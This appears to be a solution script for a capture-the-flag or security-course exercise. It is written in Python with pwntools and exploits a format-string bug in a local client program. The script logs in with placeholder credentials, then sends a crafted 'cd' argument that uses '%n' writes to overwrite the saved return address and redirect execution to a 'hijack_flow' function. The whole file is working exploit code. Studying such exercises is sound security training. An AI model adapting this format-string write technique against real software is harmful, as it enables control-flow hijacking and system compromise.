from pwn import *
import struct
# context.arch='i386'

client = process(['bin/client','127.0.0.1','1337'])

client.sendline('login u1')
client.sendline('pass p1')

# Address of hijack_flow (can be obtained in gdb):
hijack_flow = 0x5656155c
# address of do_cd's return eip (can be obtained in gdb):
stack_ret = 0xf7b04d9c

def mymod(i):
    out = i % 0x100
    while(out < 12):
        out += 0x100
    return out

s = 'cd '
current = 4 # (not sure where those 4 characters come from)
s += struct.pack("I", stack_ret)
current += 4
s += 'AAAA'
s += struct.pack("I", stack_ret + 1)
current += 4 + 4
s += 'AAAA'
s += struct.pack("I", stack_ret + 2)
current += 4 + 4
s += 'AAAA'
s += struct.pack("I", stack_ret + 3)
current += 4 + 4
# Reach the string array
s += '%08x%08x%08x%08x'
current += 32

# Compute the shifts for each byte
shifts = []
for i in range(4):
    target = (hijack_flow >> (8 * i)) & 0xFF
    shifts.append(mymod(target - current))
    current = target

# Add the shifts
s += '%' + str(shifts[0]) + 'u%n'
s += '%' + str(shifts[1]) + 'u%n'
s += '%' + str(shifts[2]) + 'u%n'
s += '%' + str(shifts[3]) + 'u%n'

client.sendline(s)
client.recvuntil('> '*3)

print("done.")
